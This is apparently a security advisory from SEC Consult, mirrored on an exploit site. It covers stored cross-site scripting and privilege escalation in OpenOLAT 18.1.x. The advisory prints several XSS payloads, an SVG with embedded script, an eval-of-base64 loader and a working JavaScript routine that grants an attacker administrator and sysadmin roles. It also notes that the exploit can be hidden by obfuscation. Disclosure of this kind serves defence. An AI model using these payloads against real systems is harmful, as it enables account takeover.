@@ -1,0 +1,264 @@
+id: 39348
+date: 02/21/2024
+title: OpenOLAT 18.1.5 Cross Site Scripting / Privilege Escalation Vulnerabilities
+author: Johannes Volpel
+cves: CVE-2024-25973, CVE-2024-25974
+
+=======================================================================
+               title: Multiple Stored Cross-Site Scripting Vulnerabilities
+             product: OpenOLAT (Frentix GmbH)
+  vulnerable version: <= 18.1.4 and <= 18.1.5
+       fixed version: 18.1.6 / 18.2
+          CVE number: CVE-2024-25973, CVE-2024-25974
+              impact: High
+            homepage: https://www.openolat.com/
+               found: 2023-12-20 and 2024-01-20
+                  by: Mike Klostermaier (Office Berlin)
+                      Johannes Völpel (Office Berlin)
+                      SEC Consult Vulnerability Lab
+
+                      An integrated part of SEC Consult, an Eviden business
+                      Europe | Asia
+
+                      https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"frentix operates in the areas of e-learning, software development, multimedia
+and media production. Providing information and lasting impressions – we
+try to reconcile this goal in the area of tension between technology, usability
+and design."
+
+"The LMS OpenOlat is an internet-based learning platform for teaching, learning,
+assessment and communication, an LMS, a learning management system."
+
+Source: https://www.openolat.com/unternehmen/
+
+
+Business recommendation:
+------------------------
+The vendor provides a patch which should be installed immediately.
+
+SEC Consult highly recommends to perform a thorough security review of the product
+conducted by security professionals to identify and resolve potential further
+security issues.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Multiple Stored Cross-Site-Scripting Vulnerabilities (CVE-2024-25973)
+Insufficient filtering and sanitization of user input leads to the creation
+of groups, courses and other resources that contain XSS payloads.
+This allows an attacker to execute JavaScript code with the permissions of the
+victim in the context of the user's browser.
+
+2) Privilege escalation via XSS due to insecure CSP
+If the content security policy is not set securely and there is content on
+the same page that can be manipulated by the attacker, a privilege
+escalation can take place.
+
+3) Stored Cross-Site-Scripting within the Media Center (CVE-2024-25974)
+Insufficient filtering and sanitization of malicious files uploaded by a user
+leads to stored resources within the Media Center that could contain XSS payloads.
+This allows an attacker to execute JavaScript code with the permissions of the
+victim in the context of the user's browser.
+
+
+Proof of concept:
+-----------------
+1) Multiple Stored Cross-Site-Scripting Vulnerabilities (CVE-2024-25973)
+Various XSS issues have been found in different functions of OpenOLAT.
+The following examples show different attack scenarios.
+
+Example 1 - Stored Cross-Site-Scripting within Coursenames
+Due to insufficient filtering and sanitization of user input, an attacker
+with rights to create or edit groups can create a course with a name that
+contains an XSS payload. When a user edits this course the name including
+the payload is displayed and executed. Furthermore, the XSS payload is
+executed when editing the course via the course-editor, within the course-editor's
+"layout" tab inside the preview. This also happens multiple times at multiple
+locations during the publishing workflow.
+
+The following payload was used as coursename:
+```
+<img src=x onerror=alert('from\u0020subcat\u0020title')>
+```
+
+Example 2 - Stored Cross-Site-Scripting within Catalogname
+An attacker, who is authenticated with rights that allow creating or renaming
+catalogs, is able to create a catalog (also called sub-category) with a name that
+contains an XSS payload due to insufficient filtering and sanitization of user
+input.
+When a user publishes a course, the name of the catalog including the
+payload is displayed and executed within the "Create catalog entry" tab
+when selecting "Add to catalog".
+
+The following payload was used as the catalog name:
+```
+<img src=x onerror=alert('from\u0020subcat\u0020title')>
+```
+
+Example 3 - Stored Cross-Site-Scripting within Curriculum Management
+An authenticated user of a role, who has the authorization to create
+curriculums, is able to create curriculums, whose name contains a JavaScript
+payload. These are shown to the members in some views where the JavaScript
+payload is executed. To do this, navigate to the overview of the curriculums
+via "Curriculum management".
+A curriculum can be created via the "Create new curriculum" button in the
+window that appears. To recreate the vulnerability, it is sufficient to
+enter a JavaScript payload as the identifier.
+
+The following payload was used as curriculum name:
+```
+<img src=x onerror=alert('from\u0020subcat\u0020title')>
+```
+When a user with sufficient rights opens the manipulated curriculum via the
+"curriculum browser" within the "Curriculum management" the payload within
+the curriculum name gets executed within the context of the user's browser.
+
+
+Example 4 - Stored Cross-Site-Scripting within Alt-Text of Media-Files
+An attacker, who is authenticated with rights that allow uploading files,
+can upload media files via the "Media Centre" and enter metadata for these
+files. One of the fields used for image metadata is the so-called alt-text
+field, which is used to enter an alternative display text for image files.
+This alternative text is not sanitized properly when entered during the upload
+of files.
+
+The following payload was assigned to an image file as alt-text:
+```
+"><img src=a onerror=alert(document.location)>
+```
+
+The upload of the image file works without further problems and is confirmed.
+After successfully uploading the image with a manipulated alt-text, the
+transmitted payload is executed directly. Using the function to share content
+with other users, this manipulated image can be shared to potential victims
+(e.g. a system administrator). The user to whom the image has been shared with
+can preview it in their media center. As soon as the user views the image details,
+the JavaScript payload stored within the alt-text is executed in the context
+of the victim's browser.
+
+
+2) Privilege escalation due to unsafe-eval
+If the content security policy is not set securely and there is content on the
+same page that can be manipulated by the attacker, a privilege escalation
+can take place. As the content security policy is set to "Report-Only" and
+"unsafe-eval" is set by default in OpenOLAT, it can be possible to use the
+following attack at least in most cases shown here using stored XSS.
+
+An example that loads a script from an external source was not used here,
+as this would not have been possible with an activated CSP, whereas this
+vulnerability can also be exploited with an activated standard CSP from
+OpenOLAT.
+The following example can be used at any given point where a XSS is possible
+and another string can be manipulated within a readable context:
+```
+"><img src=x onerror='var ps = document.querySelectorAll(`p`); for (var i = 0; i
+< ps.length; i++) { var c = ps[i].textContent; if (c.startsWith(`YXN`))
+{ eval(atob(c)); } }'
+```
+
+This JavaScript code searches the website for elements that begin
+with a certain string (in our example "YXN"), decodes them from base64 and
+executes them (due to the unsafe-eval policy) as JavaScript code.
+This has been tested to be working with example 4 with the above payload
+as the alt-text and the payload mentioned below as the description of the
+media file.
+The string "YXN" is the start of the base64-encoded following payload:
+```
+async function main() {
+     function sleep(ms) {
+         return new Promise(resolve => setTimeout(resolve, ms));
+     }
+     var n = 2000;
+     var anchorElement = document.querySelector('a[title="Manage users and system groups"]');
+  anchorElement.click();
+     await sleep(n);
+     var buttons = document.querySelectorAll('a[title="Organisations"]');
+     buttons[0].click();
+     await sleep(n);
+     var links = document.querySelectorAll('a');
+     var organisationLink = Array.from(links).find(function (link) {
+         return link.textContent === 'OpenOLAT';
+     });
+     organisationLink.click();
+     await sleep(n);
+     var links = document.querySelectorAll('a');
+     var chadLink = Array.from(links).find(function (link) {
+         return link.textContent === 'Chad';
+     });
+     await sleep(n);
+     chadLink.click();
+     await sleep(n);
+     var roleTabLinks = document.querySelectorAll('a[role="tab"]');
+     var rolesLink = Array.from(roleTabLinks).find(function (link) {
+         return link.textContent === 'Roles';
+     });
+     await sleep(n);
+     rolesLink.click();
+     await sleep(n);
+     var inputElement = document.querySelector('input[value="administrator"]');
+     inputElement.click();
+     await sleep(n);
+     var inputElement = document.querySelector('input[value="sysadmin"]');
+     inputElement.click();
+     await sleep(n);
+     var saveButton = document.querySelector('button[value="Save"]');
+     saveButton.click();
+}
+main();
+```
+
+The code shown here utilizes the static structure of OpenOLAT. The use of
+control elements is predictable, as long as the name of the organization used
+within the OpenOLAT instance is known. This information is freely accessible to
+every logged-in user. Lines 14 and 20 contain variables which must be adapted
+to the corresponding OpenOLAT instance and attacker username. The executed
+script searches for HTML elements with predictable names in order to navigate
+to an administrative interface within the application and elevate the
+attacker's rights to administrative level.
+
+The script works with two-second pauses between the individual actions
+to ensure that all actions are only executed after the page has loaded. Even
+if this is visible to the victim, the waiting times between the actions can be
+optimized in a real attack and can also be used with the help of obfuscation
+measures (e.g. additional windows that open and hide the actions).
+
+
+3) Stored Cross-Site-Scripting (XSS) within the Media-Center (CVE-2024-25974)
+It is possible to upload files within the Media Center of OpenOLAT version 18.1.5
+as an authenticated user without any other rights.
+While the filetypes are limited, an SVG containing an XSS payload can be
+uploaded. The following content has been uploaded within a file
+named 'xss.svg':
+```
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+<script type="text/javascript">
+     alert(document.location);
+</script>
+</svg>
+```
+
+After a successful upload the file can be shared with groups of users.
+By sharing the file with a group of which an administrator is part of, the
+administrator can access the file and open it, which will open the file in a
+new tab within the browser. This leads to the execution of the shown script and
+will display a message window stating the current domain and path.
+
+
+Vulnerable / tested versions:
+-----------------------------
+The following versions has been tested which was the latest version available
+at the time of the test:
+* OpenOLAT 18.1.4 Vulnerability 1 and 2
+* OpenOLAT 18.1.5 Vulnerability 3
+
+OpenOLAT version 18.2 was verified whether the identified issues were properly
+fixed.
+
+#  0day.today [2024-02-22]  #
